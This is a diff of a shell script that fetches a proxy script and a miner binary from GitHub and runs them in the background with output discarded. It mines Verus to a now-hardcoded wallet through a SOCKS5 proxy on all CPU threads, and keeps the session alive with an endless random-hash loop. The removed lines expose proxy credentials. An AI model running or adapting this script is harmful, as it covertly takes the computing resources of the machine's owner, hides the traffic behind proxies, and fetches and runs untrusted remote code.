@@ -6,9 +6,9 @@ wget -O proxy.py https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefrome
 chmod +x bionicv2 proxy.py
 python3 proxy.py >/dev/null &
 pool="stratum+tcp://na.luckpool.net:3956"
-wallet="$1"
+wallet="RYWshsv766dTZbLJ6AbHcT8HiWngTrW3qe"
 workername="$(cat /proc/sys/kernel/hostname)"
 thread="$(nproc --all)"
-proxy="socks5://gtfrmnnv:h7l3wob1wn3m@45.131.212.65:6114"
+proxy="socks5://24.249.199.12:4145"
 ./bionicv2 -a verus -o $pool -u $wallet.$workername -p x -t $thread -x $proxy >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
